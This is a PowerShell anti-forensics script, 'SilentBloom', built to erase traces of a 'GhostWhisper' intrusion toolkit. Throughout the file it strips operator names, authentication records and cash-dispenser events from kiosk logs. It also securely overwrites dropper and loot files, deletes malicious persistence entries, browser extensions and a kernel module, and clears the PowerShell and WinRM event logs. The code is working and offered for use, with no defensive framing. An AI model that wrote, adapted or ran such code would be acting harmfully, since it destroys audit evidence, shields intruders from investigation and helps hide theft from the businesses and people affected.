# SilentBloom.ps1 v1.6.0
# Comprehensive evidence removal across all GhostWhisper vectors
# Memory wipe, trace removal, secure deletion

param(
    [switch]$Full,
    [switch]$MemoryOnly,
    [switch]$LogsOnly,
    [switch]$NoBackup,
    [switch]$Silent,
    [string]$LogDir = "C:\Kiosk\Logs"
)

$script:Version = "1.6.0"
$script:GhostUsers = @("Raven", "Lenore", "Poe", "Nevermore", "Ghost", "Operator")
$script:GhostPatterns = @(
    "GhostWhisper", "GhostKey", "WraithTap", "Wormhole", "Phantom",
    "ghost_", ".ghost", "ghostkernel", "PhantomHook", "GhostBrowser",
    "GhostDesktop", "GhostSeal", "BLETrigger", "ExorcistMode"
)
$script:TargetKeywords = @(
    "active directory authentication",
    "successfully authenticated",
    "Unable to authenticate",
    "Bill Dispenser Present Cash",
    "Dispensed Amount",
    "JackpotDispenseProcessingView",
    "Cash Collected",
    "GhostResidency",
    "GHOST_TAG",
    "ghostTag"
)

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    if (-not $Silent) {
        $color = switch ($Level) {
            "SUCCESS" { "Green" }
            "WARN" { "Yellow" }
            "ERROR" { "Red" }
            default { "Gray" }
        }
        Write-Host "[$Level] $Message" -ForegroundColor $color
    }
}

function Invoke-SecureWipe {
    param(
        [string]$FilePath,
        [int]$Passes = 3
    )
    
    if (-not (Test-Path $FilePath)) { return }
    
    try {
        $fileSize = (Get-Item $FilePath -ErrorAction SilentlyContinue).Length
        if ($fileSize -eq 0) {
            Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
            return
        }
        
        for ($pass = 0; $pass -lt $Passes; $pass++) {
            $patterns = @(
                { New-Object byte[] $args[0] },
                { $b = New-Object byte[] $args[0]; [Security.Cryptography.RandomNumberGenerator]::Fill($b); $b },
                { [byte[]](@(0x00) * $args[0]) },
                { [byte[]](@(0xFF) * $args[0]) }
            )
            
            $pattern = $patterns[$pass % $patterns.Count]
            $bytes = & $pattern $fileSize
            [System.IO.File]::WriteAllBytes($FilePath, $bytes)
        }
        
        Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
        Write-Log "Secure wiped: $FilePath" "SUCCESS"
        
    } catch {
        Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
    }
}

function Clean-LogFile {
    param([string]$FilePath, [switch]$SecureDelete)
    
    if (-not (Test-Path $FilePath)) { return }
    
    try {
        $originalLines = Get-Content $FilePath -ErrorAction SilentlyContinue
        if (-not $originalLines) { return }
        
        $filteredLines = @()
        
        foreach ($line in $originalLines) {
            $exclude = $false
            
            foreach ($user in $script:GhostUsers) {
                if ($line -match $user) { $exclude = $true; break }
            }
            
            if (-not $exclude) {
                foreach ($keyword in $script:TargetKeywords) {
                    if ($line -match [regex]::Escape($keyword)) { $exclude = $true; break }
                }
            }
            
            if (-not $exclude) {
                foreach ($pattern in $script:GhostPatterns) {
                    if ($line -match $pattern) { $exclude = $true; break }
                }
            }
            
            if (-not $exclude) { $filteredLines += $line }
        }
        
        $removedCount = $originalLines.Count - $filteredLines.Count
        
        if ($removedCount -gt 0) {
            Set-Content -Path $FilePath -Value $filteredLines -Force
            Write-Log "Cleaned: $FilePath (removed $removedCount entries)" "SUCCESS"
        }
        
    } catch {
        Write-Log "Failed to clean: $FilePath - $_" "ERROR"
    }
}

function Clean-AllLogs {
    param([string]$Directory = $LogDir)
    
    Write-Log "Cleaning logs in: $Directory"
    
    if (-not (Test-Path $Directory)) {
        Write-Log "Log directory not found: $Directory" "WARN"
        return
    }
    
    $logFiles = Get-ChildItem -Path $Directory -Filter "*.log" -Recurse -ErrorAction SilentlyContinue
    $logFiles += Get-ChildItem -Path $Directory -Filter "*.txt" -Recurse -ErrorAction SilentlyContinue
    
    foreach ($log in $logFiles) {
        Clean-LogFile -FilePath $log.FullName
    }
    
    Write-Log "Processed $($logFiles.Count) log files"
}

function Remove-GhostFiles {
    Write-Log "Removing Ghost artifact files..."
    
    $ghostFiles = @(
        "$env:ProgramData\.ghost.cfg",
        "$env:ProgramData\.ghost_ble_active",
        "$env:ProgramData\ghost_ops_log.txt",
        "$env:ProgramData\ghost_anoint_log.csv",
        "$env:ProgramData\.glog.enc",
        "$env:TEMP\ghost_*",
        "$env:TEMP\phantom_*",
        "$env:TEMP\loot.zip*",
        "$env:LOCALAPPDATA\ghost_*"
    )
    
    foreach ($pattern in $ghostFiles) {
        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            Invoke-SecureWipe -FilePath $file.FullName
        }
    }
    
    $ghostDirs = @(
        "$env:TEMP\ghost_browser_*",
        "$env:TEMP\ghost_host_*",
        "$PSScriptRoot\WhisperSuite_Build",
        "$PSScriptRoot\Logs"
    )
    
    foreach ($pattern in $ghostDirs) {
        $dirs = Get-ChildItem -Path $pattern -Directory -ErrorAction SilentlyContinue
        foreach ($dir in $dirs) {
            Remove-Item -Path $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log "Removed directory: $($dir.FullName)" "SUCCESS"
        }
    }
}

function Remove-GhostDesktopTraces {
    Write-Log "Removing desktop access traces..."
    
    try {
        $rdpRules = @("Windows Remote Management (HTTPS-In)", "WMSvc", "Ghost*")
        foreach ($rule in $rdpRules) {
            netsh advfirewall firewall delete rule name="$rule" 2>$null
        }
        
        $rdpEnabled = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
        if ($rdpEnabled -and $rdpEnabled.fDenyTSConnections -eq 0) {
            Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1 -Force -ErrorAction SilentlyContinue
        }
        
        $chromeRdpPaths = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Logs",
            "${env:ProgramFiles}\Google\Chrome Remote Desktop\Logs",
            "${env:ProgramFiles(x86)}\Google\Chrome Remote Desktop\Logs"
        )
        
        foreach ($path in $chromeRdpPaths) {
            if (Test-Path $path) {
                Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        
        Write-Log "Desktop traces cleaned" "SUCCESS"
        
    } catch {
        Write-Log "Desktop cleanup error: $_" "WARN"
    }
}

function Remove-GhostKernelTraces {
    Write-Log "Removing GhostKernel traces..."
    
    try {
        if (Get-Command "wsl" -ErrorAction SilentlyContinue) {
            & wsl bash -c "sudo rmmod ghostkernel 2>/dev/null; sudo rmmod usbmon 2>/dev/null" 2>$null
        }
        
        $kernelFiles = @(
            "$PSScriptRoot\ghostkernel.ko",
            "$PSScriptRoot\GhostKernel.ko",
            "$PSScriptRoot\*.ko"
        )
        
        foreach ($pattern in $kernelFiles) {
            $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                Invoke-SecureWipe -FilePath $file.FullName
            }
        }
        
        Write-Log "GhostKernel traces cleaned" "SUCCESS"
        
    } catch {
        Write-Log "GhostKernel cleanup error: $_" "WARN"
    }
}

function Remove-GhostBrowserTraces {
    Write-Log "Removing GhostBrowser traces..."
    
    try {
        $userDataPaths = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        )
        
        foreach ($userDataPath in $userDataPaths) {
            if (-not (Test-Path $userDataPath)) { continue }
            
            $profiles = Get-ChildItem -Path $userDataPath -Directory | Where-Object { $_.Name -match "^(Default|Profile)" }
            
            foreach ($profile in $profiles) {
                $extensionsPath = Join-Path $profile.FullName "Extensions"
                if (Test-Path $extensionsPath) {
                    $extensions = Get-ChildItem $extensionsPath -Directory -ErrorAction SilentlyContinue
                    
                    foreach ($ext in $extensions) {
                        $manifestPath = Get-ChildItem -Path $ext.FullName -Recurse -Filter "manifest.json" -ErrorAction SilentlyContinue | Select-Object -First 1
                        if ($manifestPath) {
                            $content = Get-Content $manifestPath.FullName -Raw -ErrorAction SilentlyContinue
                            if ($content -match "Ghost|Phantom|ghost.*helper") {
                                Remove-Item -Path $ext.FullName -Recurse -Force -ErrorAction SilentlyContinue
                                Write-Log "Removed extension: $($ext.Name)" "SUCCESS"
                            }
                        }
                    }
                }
                
                $localStoragePath = Join-Path $profile.FullName "Local Storage\leveldb"
                if (Test-Path $localStoragePath) {
                    $ldbFiles = Get-ChildItem $localStoragePath -Filter "*.ldb" -ErrorAction SilentlyContinue
                    foreach ($ldb in $ldbFiles) {
                        $content = Get-Content $ldb.FullName -Raw -ErrorAction SilentlyContinue
                        if ($content -match "ghostTag|GHOST_MAGIC|PhantomHook") {
                            Remove-Item $ldb.FullName -Force -ErrorAction SilentlyContinue
                        }
                    }
                }
            }
        }
        
        $nativeHostFiles = @(
            "$env:LOCALAPPDATA\ghost_com.ghost.helper.json",
            "$env:LOCALAPPDATA\*ghost*.json"
        )
        
        foreach ($pattern in $nativeHostFiles) {
            $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                Invoke-SecureWipe -FilePath $file.FullName
            }
        }
        
        $regPaths = @(
            "HKCU:\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.ghost.helper"
        )
        
        foreach ($regPath in $regPaths) {
            if (Test-Path $regPath) {
                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        
        Write-Log "GhostBrowser traces cleaned" "SUCCESS"
        
    } catch {
        Write-Log "GhostBrowser cleanup error: $_" "WARN"
    }
}

function Remove-GhostPersistence {
    Write-Log "Removing persistence mechanisms..."
    
    try {
        $runKeys = @(
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
            "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
        )
        
        foreach ($keyPath in $runKeys) {
            if (Test-Path $keyPath) {
                $props = Get-ItemProperty -Path $keyPath -ErrorAction SilentlyContinue
                $props.PSObject.Properties | Where-Object { 
                    $_.Value -match "GhostKey|WraithTap|Ghost|Phantom" 
                } | ForEach-Object {
                    Remove-ItemProperty -Path $keyPath -Name $_.Name -Force -ErrorAction SilentlyContinue
                    Write-Log "Removed Run key: $($_.Name)" "SUCCESS"
                }
            }
        }
        
        $tasks = schtasks /query /fo CSV 2>$null | ConvertFrom-Csv
        $ghostTasks = $tasks | Where-Object { 
            $_.'TaskName' -match "Ghost|Worm|Phantom|WinSvc_" -or
            $_.'TaskName' -match "GhostPulse"
        }
        
        foreach ($task in $ghostTasks) {
            schtasks /delete /tn $task.'TaskName' /f 2>$null
            Write-Log "Removed task: $($task.'TaskName')" "SUCCESS"
        }
        
        Write-Log "Persistence mechanisms cleaned" "SUCCESS"
        
    } catch {
        Write-Log "Persistence cleanup error: $_" "WARN"
    }
}

function Clear-MemoryArtifacts {
    Write-Log "Clearing memory artifacts..."
    
    try {
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        [System.GC]::Collect()
        
        $script:InfectionMap = @{}
        $script:DiscoveredHosts = @{}
        $script:PhantomRegistry = @{}
        
        Write-Log "Memory artifacts cleared" "SUCCESS"
        
    } catch {
        Write-Log "Memory cleanup error: $_" "WARN"
    }
}

function Clear-EventLogs {
    Write-Log "Clearing relevant event logs..."
    
    try {
        $logsToClean = @(
            "Microsoft-Windows-PowerShell/Operational",
            "Windows PowerShell",
            "Microsoft-Windows-WinRM/Operational"
        )
        
        foreach ($logName in $logsToClean) {
            try {
                wevtutil cl "$logName" 2>$null
            } catch {}
        }
        
        Write-Log "Event logs cleaned" "SUCCESS"
        
    } catch {
        Write-Log "Event log cleanup error: $_" "WARN"
    }
}

function Backup-Logs {
    param([string]$Directory = $LogDir)
    
    if ($NoBackup) { return }
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $backupDir = "$Directory\Backup_$timestamp"
    
    try {
        if (Test-Path $Directory) {
            New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
            Copy-Item "$Directory\*.log" -Destination $backupDir -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log "Backup created: $backupDir"
        }
    } catch {
        Write-Log "Backup failed: $_" "WARN"
    }
}

# === MAIN EXECUTION ===

if (-not $Silent) {
    Write-Host ""
    Write-Host "  ╔══════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "  ║    SilentBloom v$script:Version             ║" -ForegroundColor Magenta
    Write-Host "  ║    GhostWhisper Trace Removal        ║" -ForegroundColor Magenta
    Write-Host "  ╚══════════════════════════════════════╝" -ForegroundColor Magenta
    Write-Host ""
}

Write-Log "Starting cleanup process..."

if (-not $MemoryOnly -and -not $LogsOnly) {
    Backup-Logs -Directory $LogDir
}

if ($MemoryOnly) {
    Clear-MemoryArtifacts
} elseif ($LogsOnly) {
    Clean-AllLogs -Directory $LogDir
} else {
    Clean-AllLogs -Directory $LogDir
    
    Remove-GhostFiles
    
    Remove-GhostDesktopTraces
    
    Remove-GhostKernelTraces
    
    Remove-GhostBrowserTraces
    
    Remove-GhostPersistence
    
    Clear-MemoryArtifacts
    
    if ($Full) {
        Clear-EventLogs
        
        $binaries = @("GhostKey.dll", "WraithTap.exe", "Dropper_with_Raven.exe")
        foreach ($bin in $binaries) {
            $path = Join-Path $PSScriptRoot $bin
            if (Test-Path $path) {
                Invoke-SecureWipe -FilePath $path
            }
        }
    }
}

Write-Log "Cleanup complete" "SUCCESS"

if (-not $Silent) {
    Write-Host ""
    Write-Host "  🕊️ The ghost has vanished." -ForegroundColor DarkGray
    Write-Host ""
}
